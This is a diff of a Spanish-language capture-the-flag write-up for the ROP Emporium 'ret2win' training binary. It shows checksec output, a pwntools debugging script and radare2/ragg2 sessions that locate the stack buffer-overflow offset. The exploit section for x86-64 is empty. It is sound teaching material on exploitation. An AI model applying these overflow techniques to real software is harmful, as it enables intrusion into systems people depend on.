@@ -5,9 +5,11 @@
 ## Indice
 - [x86](x86)
 - [x86-64](#x86_64)
+- [Notas](#Notas)
 
 # x86
 
+## Intro
 Lo primero que hacemos es revisar las propiedades del ejecutable. Hay varias utilidades para hacer esto (`checksec`,`rabin2`,`readelf`,etc...)
 
 ```
@@ -18,7 +20,7 @@ Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RU
 
 `No canary found`: Puede existir un buffer overflow 
 
-`No PIE`: Las direccion base del binario es fija
+`No PIE`: La direccion base del binario es fija
 
 Probemos el programa:
 
@@ -36,10 +38,11 @@ Thank you!
 zsh: segmentation fault  ./ret2win32
 ```
 
+## Overflow
+
 Perfecto, ocurre un desbordamiento de buffer, pero antes de explotarlo debemos encontrar a partir de que momento es que ocurre (la cantidad de bytes de relleno que necesitamos)
 
 Yo suelo usar radare2 como disassembler/debugger/hex editor con un par de plugins como el decompilador de ghidra; pero puede usarse cualquiera de preferencia (`gdb`,`pwndbg`,`ghidra`,`IDAPro`,etc...)
-
 
 Cuando ocurre un error de buffer overflow el mensaje se almacena en los logs del kernel de Linux. Podemos ver estos mensajes con `dmseg`
 
@@ -78,6 +81,8 @@ Big endian: 43
 ```
 
 Como x86 es little endian ahora sabemos que el desbordamiento ocurre a partir del byte 44
+
+## Explotacion
 
 Ahora revisemos el binario:
 ```
@@ -234,5 +239,136 @@ python3 ret2win32.py
 
 # x86_64
 
+## Intro
+```
+ checksec --file=ret2win
+[*] '/home/kalcast/Descargas/ret2win'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+```
+
+Mismo caso que la version x86
+
+## Overflow
+
+En x86-64 el kernel no muestra un mensaje detallado como para obtener el desplazamiento de manera precisa, hay varias vias que se pueden tomar, la primera es usar pwntools + pwndebug:
+
+``` python
+#!/bin/python3
+from pwn import *
+# set terminal gdb will run in
+# replace 'kitty' with your terminal
+# context.terminal = ['kitty']
+
+# create payload
+payload = cyclic(60, n=4)
+
+# debug rop chain
+io = gdb.debug('./ret2win32', '''
+               b pwnme
+               c
+               ''')
+# Escribir `continue` en pwndbg para observar el crash
+# Escribir cyclic -l 0xvalor_en_la_cima_del_backtrace -n 4
+io.sendline(payload)
+
+# keep the program alive
+io.interactive()
+```
+
+Otra es simplemente usar un debbuger solo como `gdb` o `radare2` o hacerlo por fuerza bruta
+
+Un ejemplo usando r2 y ragg2:
+
+Creamos input.txt y lo rellenamos con la secuencia de De Bruijn:
+```
+ ragg2 -P 100 -r > input.txt
+```
+
+Abrimos radare en modo depuracion, agregamos un breakpoint antes del retorno de la funcion y revisamos la cima de la pila:
+```
+└─$ r2 -d -A ret2win
+WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
+INFO: Analyze all flags starting with sym. and entry0 (aa)
+INFO: Analyze imports (af@@@i)
+INFO: Analyze entrypoint (af@ entry0)
+INFO: Analyze symbols (af@@@s)
+INFO: Analyze all functions arguments/locals (afva@@@F)
+ERROR: Cannot seek to unknown address '$S'
+INFO: Analyze function calls (aac)
+INFO: Analyze len bytes of instructions for references (aar)
+INFO: Finding and parsing C++ vtables (avrr)
+INFO: Analyzing methods (af @@ method.*)
+INFO: Recovering local variables (afva@@@F)
+INFO: Skipping type matching analysis in debugger mode (aaft)
+INFO: Propagate noreturn information (aanr)
+INFO: Use -AA or aaaa to perform additional experimental analysis
+ -- You look great, by the way. Very healthy
+[0x7fe2b4a1db40]> s sym.pwnme ;pdf
+            ; CALL XREF from main @ 0x4006d2(x)
+/ 110: sym.pwnme ();
+| afv: vars(1:sp[0x28..0x28])
+|           0x004006e8      55             push rbp
+|           0x004006e9      4889e5         mov rbp, rsp
+|           0x004006ec      4883ec20       sub rsp, 0x20
+|           0x004006f0      488d45e0       lea rax, [var_20h]
+|           0x004006f4      ba20000000     mov edx, 0x20               ; 32
+|           0x004006f9      be00000000     mov esi, 0
+|           0x004006fe      4889c7         mov rdi, rax
+|           0x00400701      e87afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
+|           0x00400706      bf38084000     mov edi, str.For_my_first_trick__I_will_attempt_to_fit_56_bytes_of_user_input_into_32_bytes_of_stack_buffer_ ; 0x400838 ; "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!"
+|           0x0040070b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x00400710      bf98084000     mov edi, str.What_could_possibly_go_wrong_ ; 0x400898 ; "What could possibly go wrong?"
+|           0x00400715      e836feffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x0040071a      bfb8084000     mov edi, str.You_there__may_I_have_your_input_please__And_dont_worry_about_null_bytes__were_using_read____n ; 0x4008b8 ; "You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
+|           0x0040071f      e82cfeffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x00400724      bf18094000     mov edi, 0x400918           ; "> "
+|           0x00400729      b800000000     mov eax, 0
+|           0x0040072e      e83dfeffff     call sym.imp.printf         ; int printf(const char *format)
+|           0x00400733      488d45e0       lea rax, [var_20h]
+|           0x00400737      ba38000000     mov edx, 0x38               ; '8' ; 56
+|           0x0040073c      4889c6         mov rsi, rax
+|           0x0040073f      bf00000000     mov edi, 0
+|           0x00400744      e847feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
+|           0x00400749      bf1b094000     mov edi, str.Thank_you_     ; 0x40091b ; "Thank you!"
+|           0x0040074e      e8fdfdffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x00400753      90             nop
+|           0x00400754      c9             leave
+\           0x00400755      c3             ret
+[0x004006e8]> db  0x00400755;dc
+ret2win by ROP Emporium
+x86_64
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+> AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
+Thank you!
+INFO: hit breakpoint at: 0x400755
+[0x00400755]> ATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
+ERROR: Invalid command 'ATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh' (0x41)
+[0x00400755]> pxQ 8 @rsp
+0x7fff51f2db28 0x41415041414f4141
+```
+
+Pasamos estos valores a ragg2 para calcular el offset:
+```
+ragg2 -q 0x41415041414f4141 - i input.txt
+Little endian: 40
+Big endian: -1
+```
+
+## Exploit
+
+
+ 
+# Notas
+
+En este reto calculamos el offset, pero en los siguientes retos sera el mismo para su correspondiente arquitectura.
 
 
